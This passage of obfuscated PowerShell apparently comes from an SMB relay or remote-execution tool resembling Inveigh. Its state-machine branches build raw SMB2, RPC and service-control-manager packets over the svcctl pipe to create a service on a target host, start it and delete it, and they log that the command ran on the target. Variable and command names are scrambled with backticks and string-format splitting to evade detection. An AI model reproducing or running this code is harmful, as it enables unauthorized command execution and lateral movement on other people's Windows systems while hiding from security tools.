                        ${p`AcKEt_`Smb2_HEAD`er} = &("{2}{0}{3}{6}{4}{5}{1}" -f '-Pac','r','New','k','tSMB','2Heade','e') 0x05,0x00 0x01,0x00 ${F`AlSE} ${m`Essa`Ge_`Id} ${S`mb`_`pROcE`sS_ID} ${tRee`_ID} ${S`ESSiON_`iD}
                        ${p`ACKET_`Smb2_da`Ta} = &("{1}{0}{4}{3}{5}{7}{6}{2}" -f 'ew-Packe','N','e','t','tSMB2Crea','eRe','l','questFi') ${s`MB_`NA`mE`D_PIpe_bY`Tes}
                        ${p`AcKE`T`_SM`B2_DATA}[("{2}{0}{1}"-f 'e_Acce','ss','Shar')] = 0x07,0x00,0x00,0x00  
                        ${sMb`2_`h`eaDEr} = &("{7}{5}{3}{0}{1}{4}{8}{6}{2}" -f 'ketO','rd','ry','om-Pac','eredDictio','tFr','a','Conver','n') ${pA`cKe`T_s`mb2_hE`AdEr}
                        ${sMB2_D`A`Ta} = &("{7}{2}{0}{4}{3}{6}{1}{5}"-f'ertFr','Dict','nv','dere','om-PacketOr','ionary','d','Co') ${PA`c`kEt`_Smb2`_dATA}  
                        ${PACkEt_n`e`TBiOS_`SeSsIoN_S`e`RViCE} = &("{5}{2}{3}{0}{4}{6}{1}{7}" -f 'Pac','Ser','e','w-','ketNetB','N','IOSSession','vice') ${sMB2`_`hEAdeR}."LeN`gTH" ${sMB2`_`DA`Ta}."le`NG`Th"
                        ${N`e`TB`ioS_`SesSiOn_se`RvicE} = &("{2}{9}{0}{1}{5}{8}{4}{7}{3}{6}"-f'rtFrom','-Pac','C','ar','ti','ketOrdere','y','on','dDic','onve') ${pACk`eT_NeT`BioS_S`Essi`on`_S`ervIce}
                        ${c`LIEN`T_sE`ND} = ${netBi`OS_`S`EsSIon_`Se`Rv`iCe} + ${SMB2`_he`Ad`er} + ${S`mB2`_`DaTa}
                        ${st`Age} = ("{0}{2}{1}"-f 'SendRe','eive','c')
                    }
            
                    ("{1}{2}{4}{3}{0}"-f 'W','CreateServ','i','e','c')
                    {
                        ${mESS`AgE`_`iD}++
                        ${sTAgE_`cu`Rr`e`NT} = ${st`Age}
                        ${p`AC`kEt_Sm`B2_HeA`DEr} = &("{1}{0}{2}{3}" -f'2H','New-PacketSMB','e','ader') 0x09,0x00 0x01,0x00 ${F`ALse} ${MesS`A`gE_id} ${SMb`_pROC`es`S_Id} ${t`REE_`ID} ${S`eSS`ION_id}
                        ${pA`c`keT_rP`c_da`Ta} = &("{1}{3}{2}{0}"-f'Request','New-Packe','C','tRP') 0x03 ${S`Cm_dATa}."l`EngtH" 0 0 0x01,0x00,0x00,0x00 0x00,0x00 0x0c,0x00
                        ${rp`c_`data} = &("{2}{5}{6}{1}{0}{8}{4}{3}{7}"-f 'tOrd','e','ConvertF','a','n','ro','m-Pack','ry','eredDictio') ${pAcKET_`RpC_D`A`Ta}
                        ${PACkEt_`sM`B`2_DaTA} = &("{4}{0}{3}{1}{7}{5}{2}{6}"-f'P','tSMB2Write','ques','acke','New-','e','t','R') ${SmB_`FIl`E_ID} (${Rpc`_`DAtA}."le`NgtH" + ${s`CM`_`data}."LE`NgtH")
                        ${Sm`B2_`hea`DEr} = &("{1}{6}{4}{2}{0}{5}{3}"-f 'io','ConvertFrom-Pa','ct','ary','deredDi','n','cketOr') ${PaCK`et_`sMb2_`heaDEr}
                        ${S`M`B2_dA`Ta} = &("{6}{7}{4}{5}{1}{2}{0}{3}"-f 'rderedDict','t','O','ionary','v','ertFrom-Packe','Co','n') ${P`Ac`k`Et_SmB2_dA`Ta} 
                        ${rPC_`D`AtA`_LEN`GTh} = ${sm`B`2_DaTA}."lenG`TH" + ${ScM_`d`AtA}."LE`N`GTH" + ${rPC`_d`ATA}."Len`G`Th"
                        ${P`Acket_ne`Tb`IoS_sEsS`IO`N_SerVIcE} = &("{5}{0}{3}{1}{4}{6}{2}"-f 'a','SSes','ce','cketNetBIO','sionS','New-P','ervi') ${s`Mb2_h`eader}."Len`gTh" ${rpC_dA`T`A_lEnG`Th}
                        ${N`e`T`BiOS_seS`SIon_s`ErV`I`cE} = &("{9}{3}{2}{8}{0}{1}{6}{7}{5}{10}{4}"-f'Or','d','nvertFro','o','y','ti','e','redDic','m-Packet','C','onar') ${P`AcKET_neTB`IOs_Se`sSIOn_`sErV`ICe}
                        ${c`LI`eNT_s`eNd} = ${netbIo`S`_s`eS`siOn_SeRvI`Ce} + ${SMb2_`H`EADeR} + ${smb2_`da`TA} + ${rpc_`Da`Ta} + ${scM`_d`ATA}
                        ${ST`AGE} = ("{3}{1}{2}{0}" -f 've','R','ecei','Send')
                    }

                    ("{2}{1}{3}{0}" -f'rst','t','Crea','eServiceW_Fi')
                    {
                        ${S`m`B_SpLi`T_st`AGE`_FINaL} =   ( &("{2}{3}{0}{1}"-f'RI','ABLe','gET-','Va')  M3q  ).VaLue::("{1}{0}" -f'ng','Ceili').Invoke(${SCm_`d`Ata}."l`eNg`Th" / ${sMb_sPli`T_`I`Nd`ex})
                        ${mE`SSa`ge_`id}++
                        ${s`TAgE_Cur`R`ent} = ${sTA`ge}
                        ${S`CM`_DaTA_`FIRst} = ${scM_Da`Ta}[0..(${smB_sPLi`T_i`NDEx} - 1)]
                        ${Pa`CkE`T`_`RPC_Da`TA} = &("{0}{2}{4}{1}{3}"-f'N','PCR','ew-','equest','PacketR') 0x01 0 0 0 0x02,0x00,0x00,0x00 0x00,0x00 0x0c,0x00 ${sC`M_`daTA_FIRsT}
                        ${p`AC`kET_RPC_DA`Ta}[("{2}{0}{1}" -f'Hin','t','Alloc')] =   (&("{2}{3}{0}{1}"-f'-V','aRiablE','G','eT') Xv8QNb -VAlU)::("{2}{0}{1}"-f't','es','GetBy').Invoke(${sC`m`_`DaTa}."Leng`TH")
                        ${s`mB_sp`l`IT_InDe`X_`T`RaCkEr} = ${sM`B_sP`LiT_iNdeX}
                        ${R`p`c`_dAtA} = &("{5}{6}{0}{4}{2}{3}{1}{7}" -f'om-Pack','tiona','ere','dDic','etOrd','Conver','tFr','ry') ${P`ACKe`T_`Rpc_d`Ata}
                        ${pac`KET_S`M`B2_h`eAd`Er} = &("{2}{3}{0}{1}"-f 'w-Packet','SMB2Header','N','e') 0x09,0x00 0x01,0x00 ${F`AL`Se} ${m`essag`E_`ID} ${SMb_`PRoceSs`_Id} ${Tr`EE_`id} ${sEss`ioN`_id}
                        ${pACKet`_`sMB2`_da`TA} = &("{2}{0}{3}{4}{1}"-f 'ew-Pac','uest','N','ket','SMB2WriteReq') ${sMb_f`IlE`_iD} ${RPc`_DaTa}."leN`GtH"
                        ${sMB`2_he`A`deR} = &("{2}{4}{1}{0}{5}{8}{3}{9}{7}{6}"-f'rtFrom-','e','C','e','onv','P','eredDictionary','Ord','ack','t') ${p`A`Cket_s`Mb2_He`Ader}
                        ${Smb2`_da`Ta} = &("{4}{3}{6}{0}{2}{1}{7}{5}"-f 'er','rom-PacketOrdere','tF','on','C','nary','v','dDictio') ${Pa`CK`E`T_`Smb2`_DaTa} 
                        ${rPc_DaTA_`Le`N`g`Th} = ${S`mB2_`DAtA}."LEN`GTH" + ${r`P`C_d`ATa}."L`EngtH"
                        ${p`ACKe`T_NEtbIOS`_`sESsI`On_SE`RVi`Ce} = &("{5}{2}{1}{0}{4}{6}{3}"-f'OSSe','acketNetBI','P','rvice','ssion','New-','Se') ${Sm`B2`_He`ADer}."L`e`NgTh" ${rP`C_d`ATa`_lEn`GtH}
                        ${nEtbI`o`s`_S`eSSioN_SeRVicE} = &("{6}{2}{4}{5}{0}{3}{1}"-f'tOrderedDict','ary','v','ion','ertFr','om-Packe','Con') ${Pac`ket`_Netbi`os_S`e`Ss`I`oN_SE`RVIcE}
                        ${cli`enT_SE`Nd} = ${nEtbI`O`s`_sesSioN`_ser`VI`CE} + ${SMb`2_h`EADER} + ${sMB2_`DA`Ta} + ${R`PC_D`ATA}
                        ${s`T`Age} = ("{0}{1}{2}" -f'Sen','dR','eceive')
                    }

                    ("{2}{0}{1}{3}"-f 'viceW','_M','CreateSer','iddle')
                    {
                        ${smb_`s`P`LiT_StAGE}++
                        ${MES`sagE`_`id}++
                        ${sTAge`_CUrR`eNt} = ${St`A`GE}
                        ${Scm_Dat`A_m`Idd`LE} = ${sC`m_`DAtA}[${s`M`B_split_iN`D`eX_tRaCker}..(${smb_`SplIt_I`Nd`eX_TrA`ckeR} + ${sMb_spLit`_`IND`Ex} - 1)]
                        ${SmB_sPL`i`T`_i`N`d`Ex_tR`AcKeR} += ${sm`B_spLi`T_Ind`ex}
                        ${P`A`CkEt`_RpC`_DATA} = &("{0}{2}{3}{1}" -f'N','RPCRequest','ew','-Packet') 0x00 0 0 0 0x02,0x00,0x00,0x00 0x00,0x00 0x0c,0x00 ${s`CM`_d`AtA_MiD`DlE}
                        ${Pa`CKEt_rpC`_`dATA}[("{2}{0}{1}{3}"-f 'll','ocHin','A','t')] =   ( &("{3}{1}{0}{2}" -f'RiAbL','vA','e','get-')  xV8QnB).VAlUE::("{2}{0}{1}"-f'etByte','s','G').Invoke(${s`cM_Da`Ta}."leN`gth" - ${SmB`_s`pLIt`_`InDEx_trA`CkER} + ${sMb`_`s`pLit_i`NdeX})
                        ${rPc_`D`Ata} = &("{1}{7}{5}{9}{0}{6}{8}{2}{4}{3}"-f'P','Conv','rde','ionary','redDict','Fr','acke','ert','tO','om-') ${PA`c`k`ET_`Rpc_DaTa}
                        ${P`ACK`Et_sMb2_HeAd`eR} = &("{0}{4}{2}{3}{1}"-f'Ne','2Header','ke','tSMB','w-Pac') 0x09,0x00 0x01,0x00 ${FAL`SE} ${me`ss`AgE_ID} ${sM`B_`PRo`Cess`_id} ${TRE`E_`Id} ${seS`Si`o`N_iD}
                        ${PAck`eT_`sm`B`2_dATA} = &("{2}{1}{5}{4}{6}{3}{0}"-f 't','ew','N','Reques','2','-PacketSMB','Write') ${Sm`B_F`IlE_iD} ${rPc`_D`Ata}."LEn`GTh"
                        ${SMb2`_he`Ad`Er} = &("{4}{0}{1}{3}{2}{5}"-f 'ert','From-PacketOrd','iction','eredD','Conv','ary') ${P`ACKET`_`smb2_H`E`ADeR}
                        ${s`M`B2_datA} = &("{9}{8}{5}{4}{2}{1}{0}{3}{6}{7}"-f'de','tOr','e','r','om-Pack','Fr','edDiction','ary','t','Conver') ${pACkEt_`S`MB`2_d`ATA} 
                        ${Rp`c_`dAT`A_LEnGTH} = ${sMB2`_`DAta}."lENG`Th" + ${rpc`_da`Ta}."leN`G`Th"
                        ${Pa`c`kET_`Ne`TbI`os_SE`ss`iOn`_seRv`IcE} = &("{1}{6}{4}{5}{2}{3}{0}"-f'vice','New-','S','er','etNetBIOSS','ession','Pack') ${sM`B2_HEa`DeR}."lE`NgTH" ${r`pc_Dat`A`_leNgtH}
                        ${neTbIo`s_`seSSIOn_s`Ervi`cE} = &("{0}{4}{1}{6}{3}{8}{5}{2}{7}"-f'C','ert','tiona','Pa','onv','tOrderedDic','From-','ry','cke') ${PAc`KET`_`NeTbi`oS`_S`essIOn_S`er`V`ICe}
                        ${c`lIEnt_`S`enD} = ${neTbio`s_sESsi`on`_S`ErVI`ce} + ${S`mB`2_hEaDeR} + ${smb2`_Da`Ta} + ${Rp`c_d`ATa}
                        ${s`TAGe} = ("{3}{2}{1}{0}"-f'eive','c','e','SendR')
                    }

                    ("{1}{3}{2}{0}" -f'W_Last','Cre','e','ateServic')
                    {
                        ${mEs`sagE`_Id}++
                        ${StAGe_`cuRre`NT} = ${sT`A`Ge}
                        ${sCm_dAT`A_`last} = ${s`c`m_daTa}[${s`Mb_sPLit`_I`Nd`ex_tRACKer}..${S`CM`_DaTA}."LENG`TH"]
                        ${pA`CKET`_RpC_`datA} = &("{1}{2}{3}{4}{0}" -f't','N','e','w-Packet','RPCReques') 0x02 0 0 0 0x02,0x00,0x00,0x00 0x00,0x00 0x0c,0x00 ${SCM_d`A`TA`_`LaST}
                        ${r`Pc_`dATa} = &("{1}{0}{5}{6}{3}{2}{4}" -f 'e','Conv','ona','icti','ry','rt','From-PacketOrderedD') ${PA`cKet_Rp`C`_`Data}
                        ${pacKe`T_`S`MB2`_hEAdEr} = &("{5}{1}{3}{4}{2}{0}"-f'r','ew-PacketSMB2','e','He','ad','N') 0x09,0x00 0x01,0x00 ${fa`l`sE} ${mESS`AgE`_`ID} ${s`Mb_P`R`OCesS_iD} ${trE`e_`Id} ${Se`SsI`on_id}
                        ${pACk`Et_`sMB`2`_DA`Ta} = &("{2}{5}{7}{1}{8}{0}{6}{3}{4}" -f'B2Writ','etS','Ne','s','t','w-P','eReque','ack','M') ${SMB`_Fi`LE_ID} ${r`p`C_DATa}."Leng`TH"
                        ${SM`B2`_hea`DeR} = &("{9}{3}{1}{2}{7}{8}{4}{0}{6}{5}" -f 'ered','vert','From-Pac','on','d','nary','Dictio','k','etOr','C') ${Pack`E`T`_s`M`B2_hEADER}
                        ${Sm`B`2_DAtA} = &("{3}{5}{2}{9}{10}{4}{0}{7}{6}{1}{8}" -f'dDicti','r','rtF','Co','re','nve','a','on','y','rom-Packe','tOrde') ${PA`C`Ke`T_sMb2_DA`Ta} 
                        ${RPc_Da`TA_l`enG`Th} = ${SMB`2`_dATa}."LEN`gth" + ${r`pc`_daTA}."lE`NGTH"
                        ${pACKEt_`Net`B`IOs_`S`Ess`I`ON_sE`R`VIce} = &("{4}{8}{6}{1}{2}{0}{5}{3}{7}" -f 'NetBIOSSessionServ','e','t','c','New-P','i','k','e','ac') ${s`mb2_h`E`ADeR}."lE`NgTH" ${rPc_dAT`A`_lEN`gTh}
                        ${ne`T`BI`Os`_`se`SsIoN_se`RVICe} = &("{0}{4}{8}{1}{3}{2}{5}{7}{6}" -f'Conve','m-Pa','e','ck','rtF','t','redDictionary','Orde','ro') ${PackeT_NEtbiOs_seSsi`oN`_`Se`RV`ice}
                        ${cLIEn`T_`se`Nd} = ${NEtB`ios_SEs`SioN`_SeRV`I`ce} + ${SMB2_h`e`Ader} + ${S`m`B2_DaTA} + ${R`pc_d`Ata}
                        ${sta`GE} = ("{3}{0}{2}{1}" -f 'e','ive','ce','SendR')
                    }

                    ("{3}{1}{0}{2}" -f 'vi','eleteSer','ceW','D')
                    { 

                        if( ( &("{0}{1}"-f 'd','IR') vAriable:xV8Qnb).vAlue::"t`Os`TriNG"(${Cli`En`T_`RecEiVe}[108..111]) -eq ("{2}{1}{0}" -f'00-00','d-04-','1'))
                        {
                            ${in`Vei`GH}."OUTPut`_qUe`UE"."a`Dd"(("[!] [$(Get-Date -format s)] Command executed on $Target ")) > ${Nu`LL}
                        }
                        elseif( (&("{2}{0}{1}" -f'a','bLE','vaRI')  ("X"+"V8qnb") -Valu  )::"tOs`TrI`Ng"(${cL`IE`Nt`_R`eceivE}[108..111]) -eq ("{2}{1}{0}" -f'00-00','-00-','02'))
                        {
                            ${inVe`I`GH}."OU`TpUt_q`UE`Ue"."A`dD"(("[!] [$(Get-Date -format s)] Service $SMB_service failed to start on $Target ")) > ${n`ULL}
                        }

                        ${M`Es`sag`e_ID}++
                        ${STaGE_c`U`R`RENT} = ${s`Ta`gE}
                        ${p`A`C`kET_`smB2_head`Er} = &("{2}{1}{0}{3}" -f 'MB2He','PacketS','New-','ader') 0x09,0x00 0x01,0x00 ${fal`Se} ${me`Ss`Ag`E_iD} ${SMb`_p`ROC`E`ss_ID} ${t`Ree_`id} ${se`s`SIon`_ID}
                        ${paCk`eT_S`C`m_`data} = &("{2}{0}{1}{4}{3}" -f 'w-PacketSCM','De','Ne','rviceW','leteSe') ${SM`B_sERvi`cE_co`NT`e`X`T_hANDle}
                        ${Scm_`dAtA} = &("{7}{4}{8}{5}{0}{1}{2}{6}{3}{9}" -f're','d','Di','a','v','m-PacketOrde','ction','Con','ertFro','ry') ${pACk`E`T_`S`cm_dATa}
                        ${PaCkeT_`R`p`C_daTA} = &("{4}{0}{2}{3}{1}" -f'acket','est','RPCReq','u','New-P') 0x03 ${s`Cm_DA`TA}."l`eNGTh" 0 0 0x04,0x00,0x00,0x00 0x00,0x00 0x02,0x00
                        ${rp`c`_D`AtA} = &("{4}{7}{3}{0}{2}{1}{5}{6}" -f 'tFro','-PacketO','m','ver','Co','rderedDi','ctionary','n') ${P`AC`kEt_`Rpc_`DAtA}
                        ${pack`ET_sMb`2_da`TA} = &("{5}{0}{1}{2}{8}{7}{6}{3}{4}" -f 'acke','tS','M','ue','st','New-P','iteReq','2Wr','B') ${sM`B_`FIlE_id} (${rPc_d`A`Ta}."lE`N`GTh" + ${s`c`m_dA`Ta}."len`g`Th")
                        ${SMb2_he`A`DeR} = &("{2}{4}{0}{3}{5}{1}{7}{8}{6}" -f'vertFrom','r','Co','-','n','PacketO','nary','deredDi','ctio') ${pA`ckE`T_SM`B2`_HEa`der}
                        ${smB2_`d`Ata} = &("{3}{2}{4}{7}{1}{0}{9}{8}{6}{5}" -f 't','edDic','ke','ConvertFrom-Pac','tOrd','y','ar','er','n','io') ${pac`k`ET_sMb2`_DATa} 
                        ${Rp`C_D`Ata_`LeNgth} = ${SM`B2_`daTA}."LeN`gtH" + ${S`C`M`_Data}."Len`Gth" + ${r`pC_`DaTa}."LeNg`Th"
                        ${P`AcKE`T_nE`T`B`iOS_SEsSI`On_ser`V`Ice} = &("{0}{4}{5}{3}{1}{2}" -f 'New-Packe','Servic','e','ssion','tNetB','IOSSe') ${s`m`B2_he`Ader}."L`eNgtH" ${rp`c_D`ATA_`le`NGth}
                        ${nEtB`iOS_SE`SSiOn`_SE`RV`icE} = &("{4}{2}{6}{0}{5}{7}{1}{3}"-f'-Pac','redDictiona','ve','ry','Con','ketOrd','rtFrom','e') ${PaCKEt`_n`e`T`Bios_sEs`sIO`N_sErv`ICe}
                        ${cLie`NT_`S`END} = ${NET`BIos`_SESSIO`N_S`e`RVi`ce} + ${s`m`B2_HEaDer} + ${Sm`B2`_DAta} + ${rpC_`D`ATA} + ${s`cm_DA`Ta}
                        ${S`T`AGE} = ("{0}{1}{3}{2}"-f'Send','Rece','ve','i')
                    }

                    ("{0}{1}"-f 'Log','off')
                    {
                        ${MEs`saG`E_Id}++
                        ${S`TagE_cU`RR`enT} = ${St`A`Ge}
                        ${pA`c`KeT`_S`Mb2_h`Ea`DEr} = &("{3}{4}{1}{2}{5}{0}" -f'er','-P','acketSMB2','N','ew','Head') 0x02,0x00 0x01,0x00 ${F`AlsE} ${MEssag`e_`id} ${s`Mb_PROCE`s`s_id} ${T`REE`_iD} ${SesS`IO`N`_iD}
                        ${PackeT`_s`m`B2`_data} = &("{1}{0}{4}{6}{7}{3}{2}{5}"-f'-PacketSMB2S','New','u','eq','e','est','ssionL','ogoffR')
                        ${sM`B2_He`A`DeR} = &("{9}{1}{5}{6}{7}{3}{4}{2}{0}{8}"-f'n','v','ictio','de','redD','ert','From-','PacketOr','ary','Con') ${PA`c`Ke`T_SMb2_`heaDer}
                        ${SM`B2`_DA`TA} = &("{8}{0}{4}{7}{2}{9}{5}{6}{1}{3}" -f'v','edDiction','From-Pa','ary','e','de','r','rt','Con','cketOr') ${PaCKet_`Sm`B2_Da`TA}
                        ${paCkEt_nEtb`IO`s`_S`Es`sIo`N_SE`RVice} = &("{3}{5}{6}{1}{4}{0}{2}"-f 'sionSe','etBIO','rvice','New-Pa','SSes','cket','N') ${smB2_h`E`ADeR}."Le`N`gtH" ${s`MB2_d`ATa}."l`EN`gtH"
                        ${n`E`T`BIOs_SESsi`o`N_`sER`VICe} = &("{0}{6}{3}{2}{1}{4}{5}"-f 'Convert','rde','etO','ck','redDic','tionary','From-Pa') ${PACKEt_nETbi`o`s_s`eS`S`io`N_S`eRviCE}
                        ${c`lient_S`end} = ${ne`T`BI`oS_SES`SION`_SE`RVi`cE} + ${smB`2_hE`Ad`eR} + ${sM`B`2_dATA}
                        ${s`T`AGE} = ("{2}{0}{1}{3}" -f 'ndR','ece','Se','ive')
                    }

                    ("{1}{2}{0}"-f 'ManagerW','O','penSC')
                    {
                        ${M`es`Sage`_ID}++
                        ${StA`GE_`cU`RrenT} = ${S`Ta`Ge}
                        ${paCkET`_`sMb`2_HeaDEr} = &("{3}{5}{0}{1}{2}{4}"-f'ac','ket','SMB2','N','Header','ew-P') 0x09,0x00 0x01,0x00 ${Fa`LSe} ${mESsAG`E`_`ID} ${SMB_p`Ro`cESS`_iD} ${TR`Ee`_ID} ${s`eS`SiON`_id}
                        ${P`AcKE`T_sc`m_`DAta} = &("{4}{6}{3}{7}{2}{5}{1}{0}"-f 'rW','SCManage','Ope','P','Ne','n','w-','acketSCM') ${s`m`B_`S`erViCe_byt`eS} ${s`M`B_sErviCE`_L`E`NgTH}
                        ${Scm_d`A`Ta} = &("{3}{6}{4}{1}{5}{0}{2}"-f 'nar','PacketOrdered','y','Co','m-','Dictio','nvertFro') ${p`A`C`kET_sCm_daTa}
                        ${P`A`CKET_rpc_D`Ata} = &("{1}{0}{5}{4}{3}{2}"-f 'w-Pa','Ne','PCRequest','tR','e','ck') 0x03 ${sCM_`d`AtA}."lEn`GTH" 0 0 0x01,0x00,0x00,0x00 0x00,0x00 0x0f,0x00
                        ${RPC`_da`Ta} = &("{6}{0}{5}{4}{3}{1}{2}" -f 'onver','Dictio','nary','d','ere','tFrom-PacketOrd','C') ${Packe`T_rpC`_da`Ta} 
                        ${p`ACkE`T_Smb`2`_DA`TA} = &("{2}{4}{3}{1}{5}{6}{0}" -f't','SMB2WriteRe','Ne','Packet','w-','q','ues') ${SM`B_FiLE_`iD} (${rpC_`D`ATa}."LEN`gTH" + ${sCM_D`A`TA}."Le`N`GTh")
                        ${s`mB2_`headER} = &("{0}{4}{3}{2}{5}{1}"-f 'Con','Dictionary','cketOr','rtFrom-Pa','ve','dered') ${PA`cKEt`_SM`B2`_h`eADER}
                        ${sm`B`2`_dAtA} = &("{4}{2}{3}{1}{0}{5}" -f'ctionar','etOrderedDi','nvertF','rom-Pack','Co','y') ${pa`CkE`T`_SmB`2_datA} 
                        ${rPC_datA_`lenG`Th} = ${sMb`2`_D`ATA}."l`ENgTh" + ${SCm`_dATa}."Le`NGTh" + ${rPc`_DATA}."LE`Ngth"
                        ${PAc`keT`_nET`BiOS_`SE`S`SIOn`_Se`R`VICE} = &("{6}{2}{3}{5}{0}{7}{1}{4}" -f's','nServ','ketNe','tBI','ice','OSSes','New-Pac','io') ${Smb2_`hea`dEr}."Len`GTh" ${rP`C_daTA_`LEngTh}
                        ${n`et`BIos`_sEssiON_sERv`IcE} = &("{2}{5}{1}{6}{3}{4}{0}"-f'y','der','ConvertFr','ictiona','r','om-PacketOr','edD') ${pa`C`ke`T`_N`ETbIos_SessION`_SErV`IcE}
                        ${C`lIENt_`Send} = ${nETBiOs_Ses`s`IO`N_`Se`RvIcE} + ${SM`B2_he`Ad`ER} + ${SMb2_`Da`TA} + ${rpc_d`Ata} + ${s`CM`_DaTa}
                        ${s`T`AGe} = ("{0}{3}{2}{1}" -f'Se','ceive','Re','nd')         
                    }

                    ("{0}{2}{1}{3}" -f 'ReadReq','s','ue','t')
                    {
                        &("{3}{0}{2}{1}"-f'tar','leep','t-S','S') -m 150
                        ${M`Es`S`AGE_id}++
                        ${stA`gE_cURr`enT} = ${s`TaGE}
                        ${PaCKEt_S`mb2_h`ea`d`ER} = &("{1}{4}{3}{2}{0}" -f 'r','N','e','MB2Head','ew-PacketS') 0x08,0x00 0x01,0x00 ${FAL`Se} ${ME`sSag`E`_id} ${smb_`pR`o`cesS_`ID} ${tR`ee_`Id} ${SeS`s`io`N_iD}
                        ${p`ACkEt`_`SM`B2_da`Ta} = &("{0}{1}{5}{4}{2}{6}{3}" -f 'New-Packe','tSMB2R','Re','est','ad','e','qu') ${s`mB_f`ILE_iD}
                        ${Pa`cKeT`_sMb2`_D`ATA}[("{0}{1}"-f'Leng','th')] = 0xff,0x00,0x00,0x00
                        ${SM`B2_h`eADer} = &("{1}{4}{3}{8}{7}{5}{2}{6}{0}" -f 'ary','Co','d','Packet','nvertFrom-','re','Diction','e','Ord') ${pa`ck`et_SMB2`_H`eADER}
                        ${smB2_D`A`Ta} = &("{1}{9}{3}{10}{8}{4}{7}{6}{0}{2}{5}"-f 'icti','ConvertF','onar','-','Orde','y','D','red','et','rom','Pack') ${pA`ckEt_`SM`B`2_Data} 
                        ${PAck`e`T_`NET`Bi`o`S_SesSI`on_S`er`ViCE} = &("{4}{5}{3}{2}{7}{1}{6}{0}" -f 'ice','ionSer','BIO','ketNet','New-P','ac','v','SSess') ${SM`B`2_`heAder}."Le`Ng`Th" ${sm`B2_Da`Ta}."lENg`Th"
                        ${N`e`T`BIoS_sEsSIOn_S`e`RVice} = &("{5}{0}{2}{6}{3}{4}{1}"-f 'e','nary','rtFrom-Pac','rderedD','ictio','Conv','ketO') ${pAck`eT_`N`Et`BI`oS_SeS`SioN_sERVi`Ce}
                        ${c`li`EnT`_SEND} = ${netBIos_s`ESS`io`N`_SERVice} + ${SM`B2`_`HEadEr} + ${S`mB2_dA`Ta} 
                        ${s`T`AGe} = ("{1}{0}{2}"-f'iv','SendRece','e')
                    }

                    ("{1}{0}"-f'CBind','RP')
                    {
                        ${sM`B_na`mEd`_pIp`E`_bYTES} = 0x73,0x00,0x76,0x00,0x63,0x00,0x63,0x00,0x74,0x00,0x6c,0x00 
                        ${SM`B_Fil`E`_Id} = ${C`l`IENT_rEceI`Ve}[132..147]
                        ${m`essAG`e_`Id}++
                        ${sTaGE_Cu`Rr`eNt} = ${st`Age}
                        ${PaCKEt`_sm`B2`_Header} = &("{4}{0}{3}{1}{2}" -f 'ketSMB','Head','er','2','New-Pac') 0x09,0x00 0x01,0x00 ${fa`L`Se} ${ME`SsagE`_Id} ${SM`B`_PR`oCESS_id} ${T`R`Ee_id} ${s`EssI`ON`_ID}
                        ${pa`ck`et_rp`C`_dAta} = &("{1}{3}{2}{0}"-f 'CBind','New-Pack','P','etR') 0x48,0x00 1 0x01 0x00,0x00 ${NAme`D_pIPE`_`UuID} 0x02,0x00
                        ${Rp`C_`data} = &("{9}{7}{2}{5}{1}{6}{4}{10}{3}{8}{0}"-f 'onary','tOrd','m-Pa','ic','red','cke','e','nvertFro','ti','Co','D') ${pACKE`T`_Rp`C_dATA} 
                        ${PackE`T_SMb`2`_dATA} = &("{7}{0}{5}{2}{3}{1}{6}{4}" -f'c','eRe','r','it','est','ketSMB2W','qu','New-Pa') ${SMb_`FiL`E`_ID} ${rpC_da`Ta}."lE`NGTh"
                        ${Sm`B2_he`ADER} = &("{2}{3}{0}{4}{1}{5}"-f'ketOrdered','a','ConvertFrom-Pa','c','Diction','ry') ${PaCkE`T_`S`M`B`2_head`Er}
                        ${smb2`_d`AtA} = &("{5}{7}{1}{0}{4}{6}{2}{3}"-f'-Packe','om','ic','tionary','tO','C','rderedD','onvertFr') ${PaC`Ke`T`_`Smb2_`DatA} 
                        ${RpC_dAtA`_`LEN`GtH} = ${SMb2`_`DaTa}."Le`Ngth" + ${rPC`_d`ATa}."lE`NGth"
                        ${pA`ck`e`T_`NE`T`BIOs_S`esSion_ser`V`ice} = &("{5}{2}{3}{4}{0}{1}" -f'S','ervice','cket','Ne','tBIOSSession','New-Pa') ${sM`B`2_HEAD`Er}."Leng`Th" ${RPC_DA`T`A_`le`NGtH}
                        ${n`EtbiO`S`_s`eS`SiON_`sERviCE} = &("{0}{1}{3}{5}{7}{2}{6}{4}" -f'Conver','tFr','Or','om-','dDictionary','Packe','dere','t') ${PAc`k`eT_netBios_S`esSION`_sE`R`VI`cE}
                        ${c`lieNT`_`Send} = ${nETbI`OS`_SeSSIOn_se`R`VI`ce} + ${SM`B`2_HeADer} + ${sm`B`2`_daTa} + ${RPc`_da`TA}
                        ${sT`Age} = ("{0}{2}{1}" -f 'S','ndReceive','e')
                    }

                    ("{2}{1}{0}" -f 've','ndRecei','Se')
                    {
                        ${cLIen`T`_ST`R`Eam}.("{1}{0}" -f'te','Wri').Invoke(${cLIent`_S`ENd},0,${CL`Ient_`SEnD}."Le`Ng`Th") > ${N`ULl}
                        ${CL`IE`NT_`stre`AM}.("{1}{0}" -f'h','Flus').Invoke()
                        ${cLIEnt_s`TR`EAm}.("{1}{0}"-f 'd','Rea').Invoke(${C`l`I`Ent`_reCEIve},0,${c`LIe`Nt_RE`CE`iVe}."LEN`g`Th") > ${N`ULl}

                        if(&("{3}{0}{2}{1}" -f'et-StatusP','ding','en','G') ${C`L`iE`NT_`REcEive}[12..15])
                        {
                            ${STa`ge} = ("{1}{0}{2}" -f'a','St','tusPending')
                        }
                        else
                        {
                            ${s`T`Age} = ("{3}{0}{2}{1}" -f's','d','Receive','Statu')
                        }

                    }

                    ("{1}{2}{0}{4}{3}"-f 'v','StartS','er','ceW','i')
                    {

                        if( (&("{1}{0}" -f'R','DI')  VArIABLE:Xv8qnb ).VAlUe::"t`oStrI`Ng"(${cLi`eNt`_r`eceive}[132..135]) -eq ("{2}{0}{3}{1}"-f'0-0','0','00-0','0-0'))
                        {
                            ${inv`EI`GH}."OutPuT_`Q`UEuE"."a`dD"(("[!] [$(Get-Date -format s)] Service $SMB_service created on $Target ")) > ${N`ULl}
                            ${INV`eiGh}."OuTPuT_`q`UeUe"."A`Dd"(("[!] [$(Get-Date -format s)] Trying to execute command on $Target ")) > ${N`ULl}
                            ${Smb`_`SErV`Ic`E`_CONt`E`Xt_HAnDLe} = ${c`LIeNT`_rEc`eiVe}[112..131]
                            ${meSSaG`E_`Id}++
                            ${STAge_cu`R`Re`NT} = ${st`A`ge}
